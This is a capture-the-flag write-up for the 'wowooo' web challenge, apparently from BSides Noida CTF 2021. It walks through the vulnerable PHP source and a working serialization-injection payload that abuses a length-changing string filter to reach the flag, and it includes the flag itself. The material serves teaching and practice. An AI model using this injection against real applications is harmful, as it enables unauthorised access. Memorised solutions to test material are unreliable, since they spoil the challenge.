# wowooo 462 points

# Description
it's really interesting
Note : Bruteforce is not required.

[Link](http://34.88.85.200:4001/)

# Solution

There are no interesting things on the web page so I look at the source code

```html
PLSSS DONT HACK ME!!!!!!
<!-- debug -->
```

There is a comment "**debug**"

So we have to set "**debug**" http parameter

`34.88.85.200:4001/?debug`

We can see the source code
```php
 <?php
include 'flag.php';
function filter($string){
    $filter = '/flag/i';
    return preg_replace($filter,'flagcc',$string);
}
$username=$_GET['name'];
$pass="V13tN4m_number_one";
$pass="Fl4g_in_V13tN4m";
$ser='a:2:{i:0;s:'.strlen($username).":\"$username\";i:1;s:".strlen($pass).":\"$pass\";}";

$authen = unserialize(filter($ser));

if($authen[1]==="V13tN4m_number_one "){
    echo $flag;
}
if (!isset($_GET['debug'])) {
    echo("PLSSS DONT HACK ME!!!!!!").PHP_EOL;
} else {
    highlight_file( __FILE__);
}
?>
<!-- debug --> 
```
Let's understand the code
```php
<?php
include 'flag.php';
```
It include other *php file* `flag.php`.Our **flag** must be there

```php
function filter($string){
    $filter = '/flag/i';
    return preg_replace($filter,'flagcc',$string);
}
```
The `filter` function looks for "**flag**" in `$string` and **replaces** it with "**flagcc**"
```php
$username=$_GET['name'];
$pass="V13tN4m_number_one";
$pass="Fl4g_in_V13tN4m";
$ser='a:2:{i:0;s:'.strlen($username).":\"$username\";i:1;s:".strlen($pass).":\"$pass\";}";
```
The website takes `name` http parameter and stores it in `$username`.

Then it set `$pass` variable. ( Note: the `$pass` will be "Fl4g_in_V13tN4m" because it is seted after "V13tN4m_number_one" )

Our input will be combined with [PHP Serialization Format](https://en.wikipedia.org/wiki/PHP_serialization_format) string in `$ser` variable.
```php
$authen = unserialize(filter($ser));

if($authen[1]==="V13tN4m_number_one "){
    echo $flag;
}
```
The `$ser` will be passed into `filter` function and then [unserialize](https://www.php.net/manual/en/function.unserialize.php) function

And then the *second* index of the result will be *compared* with "V13tN4m_number_one ". ( Note there is a space after the string )

If **equals**, our **flag** will be echoed.
```php
if (!isset($_GET['debug'])) {
    echo("PLSSS DONT HACK ME!!!!!!").PHP_EOL;
} else {
    highlight_file( __FILE__);
}
?>
<!-- debug --> 
```
The rest is checking `debug` http parameter and if it is seted show the source *code*

So far we understand the code

To get the **flag** the second index of the result from `unserialize` must be "V13tN4m_number_one " instead of "Fl4g_in_V13tN4m"

Our *input* which is combined with *serialization format* in `$ser` variable is unfiltered and we can do **injection** attack!

But we can't send `";i:1;s:19:"V13tN4m_number_one ";}` straight because `strlen($username)` return the length of our whole payload
```
a:2:{i:0;s:strlen($username):"$username;...

becomes

a:2:{i:0;s:34:"";i:1;s:19:"V13tN4m_number_one ";}... 
```
The integer after **first** `s` must be the length of the **first** string.In our case it is `34` and the string is empty ""

So it doesn't work

Luckily there is `filter` function which replaces "flag" with "flagcc" and extending the length of the **first** string by 2.The function is called after `strlen($username)` so we can make our *length* of **first string** equals to the result of `strlen`

After trying for the length to be matched, the final *payload* looks like this

`flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:1;s:19:"V13tN4m_number_one ";}`

When we pass that *payload*
```
before passing to filter function
a:2:{i:0;s:102:"flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:1;s:19:"V13tN4m_number_one ";}...

after passing to filter function
a:2:{i:0;s:102:"flagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagccflagcc";i:1;s:19:"V13tN4m_number_one ";}..
```
The length of **first** string `flagccflagcc...` is now 102 and it equals to the integer after **first** `s`

Send that **payload**!!!

`http://34.88.85.200:4001/?name=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag%22;i:1;s:19:%22V13tN4m_number_one%20%22;}`

And there is the flag

<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/wowooo/info.png">

*flag*: `BSNoida{3z_ch4all_46481684185_!!!!!!@!}`
